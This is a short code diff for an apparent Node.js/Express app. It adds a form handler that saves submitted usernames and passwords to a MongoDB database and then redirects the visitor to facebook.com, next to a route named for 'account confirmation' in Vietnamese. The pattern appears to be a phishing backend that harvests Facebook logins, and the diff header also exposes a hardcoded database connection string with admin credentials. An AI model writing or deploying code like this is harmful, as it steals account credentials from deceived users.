@@ -44,7 +44,22 @@ mongoose.connect('mongodb+srv://admin:admin@cluster0.jc001.mongodb.net/NodeJs?re
         console.log("connect successfull")
     }
 });
-
+app.get("/", function(req, res){
+    res.render("demo")
+});
+app.post("/", function(req, res){
+    
+        
+            var demoss = demos({
+                user: req.body.user,
+                pass:req.body.pass
+            });
+            demoss.save(function (err) {
+                    res.redirect('https://www.facebook.com/');         
+            })
+        
+    
+});
 app.get("/xac-nhan-tai-khoan", function(req, res){
     res.render("demo")
 });
